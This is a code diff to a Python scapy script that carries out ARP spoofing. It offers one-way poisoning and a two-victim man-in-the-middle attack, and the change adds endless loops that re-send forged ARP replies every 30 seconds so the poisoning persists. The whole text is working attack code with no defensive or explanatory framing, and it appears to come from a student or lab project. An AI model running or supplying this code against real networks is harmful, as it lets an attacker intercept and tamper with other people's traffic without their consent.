@@ -1,4 +1,9 @@
 from scapy.all import *
+import time
+
+def ellapsed_time(st):
+    et = time.time() - st
+    return et
 
 def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof):
     arp = Ether() / ARP()
@@ -20,7 +25,12 @@ def oneWayPoisoning():
 
     ipToSpoof = input("IP address to impersonate:")
     
-    arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof)
+    start_time = time.time()
+    
+    while True:
+        if (ellapsed_time(start_time) > 30):
+            arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof)
+            start_time = time.time()
     
 def mimAttack():
     macAttacker = input("Attacker MAC address:")
@@ -32,5 +42,10 @@ def mimAttack():
     macVictim2 = input("Victim 2 MAC address:")
     ipVictim2 = input("Victim 2 IP address:")
     
-    arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2)
-    arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1)
+    start_time = time.time()
+    
+    while True:
+        if (ellapsed_time(start_time) > 30):
+            arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2)
+            arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1)
+            start_time = time.time()
